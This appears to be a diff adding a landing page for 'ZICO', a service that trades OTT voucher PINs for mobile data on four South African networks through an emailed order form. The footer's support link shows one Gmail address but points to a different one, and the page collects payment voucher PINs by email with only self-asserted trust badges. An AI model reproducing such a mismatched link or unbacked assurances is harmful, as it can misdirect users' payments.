@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ZICO — Data, Instantly</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="favicon.svg">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header>
+  <div class="nav wrap">
+    <div class="brand">
+      <svg width="32" height="32" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path d="M17 3 29 7v8.6c0 7.9-5.1 13-12 14.6-6.9-1.6-12-6.7-12-14.6V7L17 3Z" fill="var(--accent)" style="transition:fill .4s ease" fill-opacity=".14"/>
+        <path d="M17 3 29 7v8.6c0 7.9-5.1 13-12 14.6-6.9-1.6-12-6.7-12-14.6V7L17 3Z" stroke="var(--accent)" stroke-width="1.6" style="transition:stroke .4s ease"/>
+        <path d="M11.5 17.3 15.3 21 22.5 13.5" stroke="var(--accent)" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round" style="transition:stroke .4s ease"/>
+      </svg>
+      <div class="brand-text">
+        <span class="brand-name">ZICO</span>
+        <span class="brand-slogan">Verified voucher data orders</span>
+      </div>
+    </div>
+    <nav class="navlinks">
+      <a href="#networks">Networks</a>
+      <a href="#pricing">Bundles</a>
+      <a href="#how">How it works</a>
+    </nav>
+    <a href="#order" class="btn">Order data</a>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <div class="eyebrow"><span class="dot"></span> Vodacom · MTN · Cell C · Telkom</div>
+    <h1>Data, paid with an <em id="hero-accent-word">OTT voucher</em>.</h1>
+    <p>ZICO turns your OTT voucher into mobile data — no app, no login, no waiting in a queue. Pick your network, pick your bundle, send the voucher, get your data.</p>
+    <p style="margin-top:10px; font-weight:600; color:var(--text); font-size:14px; letter-spacing:.03em; text-transform:uppercase;">Stay connected with ZICO</p>
+    <div class="hero-ctas">
+      <a href="vip.html" class="btn">VIP Data Deals</a>
+      <a href="#order" class="btn btn-ghost">Place an order</a>
+    </div>
+  </div>
+</section>
+
+<section class="trust-bar">
+  <div class="wrap trust-grid">
+    <div class="trust-item">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2 4 5v6c0 5 3.4 8.7 8 9.9 4.6-1.2 8-4.9 8-9.9V5l-8-3Z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <span>Orders reviewed by a real person<small>No bots — every voucher is checked before data is loaded</small></span>
+    </div>
+    <div class="trust-item">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 22c5.5-1.4 8-5.6 8-10V6l-8-4-8 4v6c0 4.4 2.5 8.6 8 10Z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/></svg>
+      <span>All four major networks<small>Vodacom, MTN, Cell C and Telkom supported</small></span>
+    </div>
+    <div class="trust-item">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.6"/><path d="M12 7v5l3.5 2" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <span>Replies the same business day<small>Order emails are checked and processed daily</small></span>
+    </div>
+  </div>
+</section>
+
+<section class="networks" id="networks">
+  <div class="wrap">
+    <div class="section-head">
+      <div class="kicker">Step one</div>
+      <h2>Choose your network</h2>
+      <p>Prices and bundles below update to match the network you pick.</p>
+    </div>
+    <div class="net-tabs">
+      <div class="net-tab active" data-network="vodacom" data-accent="#c81e2b" data-text="#ffffff">
+        <svg class="sim-icon" style="color:#c81e2b" width="26" height="26" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M7 3h7.2L19 7.8V20a1.4 1.4 0 0 1-1.4 1.4H7A1.4 1.4 0 0 1 5.6 20V4.4A1.4 1.4 0 0 1 7 3Z" fill="currentColor" fill-opacity=".14" stroke="currentColor" stroke-width="1.4" stroke-linejoin="round"/>
+          <rect x="8.4" y="9.4" width="7.2" height="6" rx="1.1" stroke="currentColor" stroke-width="1.2"/>
+          <path d="M8.4 12.4h7.2M12 9.4v6" stroke="currentColor" stroke-width="1"/>
+        </svg>
+        <div class="name">Vodacom</div>
+      </div>
+      <div class="net-tab" data-network="mtn" data-accent="#cf9e00" data-text="#111111">
+        <svg class="sim-icon" style="color:#cf9e00" width="26" height="26" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M7 3h7.2L19 7.8V20a1.4 1.4 0 0 1-1.4 1.4H7A1.4 1.4 0 0 1 5.6 20V4.4A1.4 1.4 0 0 1 7 3Z" fill="currentColor" fill-opacity=".14" stroke="currentColor" stroke-width="1.4" stroke-linejoin="round"/>
+          <rect x="8.4" y="9.4" width="7.2" height="6" rx="1.1" stroke="currentColor" stroke-width="1.2"/>
+          <path d="M8.4 12.4h7.2M12 9.4v6" stroke="currentColor" stroke-width="1"/>
+        </svg>
+        <div class="name">MTN</div>
+      </div>
+      <div class="net-tab" data-network="cellc" data-accent="#c15c0a" data-text="#ffffff">
+        <svg class="sim-icon" style="color:#c15c0a" width="26" height="26" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M7 3h7.2L19 7.8V20a1.4 1.4 0 0 1-1.4 1.4H7A1.4 1.4 0 0 1 5.6 20V4.4A1.4 1.4 0 0 1 7 3Z" fill="currentColor" fill-opacity=".14" stroke="currentColor" stroke-width="1.4" stroke-linejoin="round"/>
+          <rect x="8.4" y="9.4" width="7.2" height="6" rx="1.1" stroke="currentColor" stroke-width="1.2"/>
+          <path d="M8.4 12.4h7.2M12 9.4v6" stroke="currentColor" stroke-width="1"/>
+        </svg>
+        <div class="name">Cell C</div>
+      </div>
+      <div class="net-tab" data-network="telkom" data-accent="#0a4f8c" data-text="#ffffff">
+        <svg class="sim-icon" style="color:#0a4f8c" width="26" height="26" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M7 3h7.2L19 7.8V20a1.4 1.4 0 0 1-1.4 1.4H7A1.4 1.4 0 0 1 5.6 20V4.4A1.4 1.4 0 0 1 7 3Z" fill="currentColor" fill-opacity=".14" stroke="currentColor" stroke-width="1.4" stroke-linejoin="round"/>
+          <rect x="8.4" y="9.4" width="7.2" height="6" rx="1.1" stroke="currentColor" stroke-width="1.2"/>
+          <path d="M8.4 12.4h7.2M12 9.4v6" stroke="currentColor" stroke-width="1"/>
+        </svg>
+        <div class="name">Telkom</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="pricing" id="pricing">
+  <div class="wrap">
+    <div class="price-grid">
+      <div class="price-card">
+        <div class="gb">5GB</div>
+        <div class="price" data-price-key="5gb">R60 OTT</div>
+        <div class="tag" id="net-label-1">Vodacom</div>
+        <button class="btn buy" data-bundle="5GB" data-price="R60 OTT">Order</button>
+      </div>
+      <div class="price-card">
+        <div class="gb">10GB</div>
+        <div class="price" data-price-key="10gb">R80 OTT</div>
+        <div class="tag" id="net-label-2">Vodacom</div>
+        <button class="btn buy" data-bundle="10GB" data-price="R80 OTT">Order</button>
+      </div>
+      <div class="price-card">
+        <div class="gb">15GB</div>
+        <div class="price" data-price-key="15gb">R130 OTT</div>
+        <div class="tag" id="net-label-3">Vodacom</div>
+        <button class="btn buy" data-bundle="15GB" data-price="R130 OTT">Order</button>
+      </div>
+      <div class="price-card">
+        <div class="gb">20GB</div>
+        <div class="price" data-price-key="20gb">R150 OTT</div>
+        <div class="tag" id="net-label-4">Vodacom</div>
+        <button class="btn buy" data-bundle="20GB" data-price="R150 OTT">Order</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="steps" id="how">
+  <div class="wrap">
+    <div class="section-head">
+      <div class="kicker">How it works</div>
+      <h2>Three steps, no app required</h2>
+    </div>
+    <div class="step-grid">
+      <div class="step">
+        <div class="idx">01</div>
+        <h3>Pick network &amp; bundle</h3>
+        <p>Choose Vodacom, MTN, Cell C or Telkom, then the bundle size you need.</p>
+      </div>
+      <div class="step">
+        <div class="idx">02</div>
+        <h3>Send your OTT voucher</h3>
+        <p>Fill in the order form with your OTT voucher PIN as payment for the bundle.</p>
+      </div>
+      <div class="step">
+        <div class="idx">03</div>
+        <h3>Get your data</h3>
+        <p>Once the voucher is confirmed, your data lands straight on your number.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="order" id="order">
+  <div class="wrap">
+    <div class="section-head">
+      <div class="kicker">Step two</div>
+      <h2>Place your order</h2>
+      <p>Fill this in and it opens your email app with a professional order summary ready to send.</p>
+    </div>
+
+    <form class="order-box" id="orderForm" novalidate>
+      <div class="row two">
+        <div>
+          <label for="fullname">Full name</label>
+          <input type="text" id="fullname" name="fullname" placeholder="Your name" required>
+        </div>
+        <div>
+          <label for="cell">Cell number to receive data</label>
+          <input type="tel" id="cell" name="cell" placeholder="e.g. 0821234567" required inputmode="numeric" autocomplete="tel-national" maxlength="10" pattern="[0-9]{10}" aria-describedby="cellHint cellError">
+          <div class="field-hint" id="cellHint">Enter exactly 10 digits, e.g. 0821234567.</div>
+          <div class="field-error" id="cellError"></div>
+        </div>
+      </div>
+
+      <div class="row two">
+        <div>
+          <label for="network">Network</label>
+          <select id="network" name="network" required>
+            <option value="Vodacom">Vodacom</option>
+            <option value="MTN">MTN</option>
+            <option value="Cell C">Cell C</option>
+            <option value="Telkom">Telkom</option>
+          </select>
+        </div>
+        <div>
+          <label for="bundle">Bundle</label>
+          <select id="bundle" name="bundle" required>
+            <option value="5GB — R60 OTT">5GB — R60 OTT</option>
+            <option value="10GB — R80 OTT">10GB — R80 OTT</option>
+            <option value="15GB — R130 OTT">15GB — R130 OTT</option>
+            <option value="20GB — R150 OTT">20GB — R150 OTT</option>
+          </select>
+        </div>
+      </div>
+
+      <div>
+        <label for="voucherpin">OTT voucher PIN (payment)</label>
+        <input type="text" id="voucherpin" name="voucherpin" placeholder="Enter the OTT voucher PIN" required inputmode="numeric" minlength="12" maxlength="20" pattern="[0-9]{12,20}" aria-describedby="voucherpinHint voucherpinError">
+        <div class="field-hint" id="voucherpinHint">Enter 12 to 20 digits from your OTT voucher.</div>
+        <div class="field-error" id="voucherpinError"></div>
+      </div>
+
+      <div class="voucher-note">
+        <span>⚠️</span>
+        <span><b>Note:</b> your OTT voucher PIN is your payment — send it only when you're ready to order. Double-check the PIN before submitting, since incorrect PINs can delay your data.</span>
+      </div>
+
+      <div>
+        <label for="notes">Notes (optional)</label>
+        <textarea id="notes" name="notes" rows="3" placeholder="Anything else we should know"></textarea>
+      </div>
+
+      <div class="form-status" id="orderStatus"></div>
+
+      <div class="submit-row">
+        <button type="submit" class="btn">Send order via email</button>
+        <span class="submit-note">Opens your email app addressed to us, prefilled with a professional order summary.</span>
+      </div>
+    </form>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="brand"><span class="brand-name">ZICO</span></div>
+    <div>Data, paid with an OTT voucher. Vodacom · MTN · Cell C · Telkom.</div>
+    <div class="contact">Order support: <a href="mailto:dakalaolanga37@gmail.com">matibackubu@gmail.com</a></div>
+    <div>© 2026 ZICO. All rights reserved.</div>
+  </div>
+</footer>
+
+<script src="zico.js"></script>
+
+</body>
+</html>
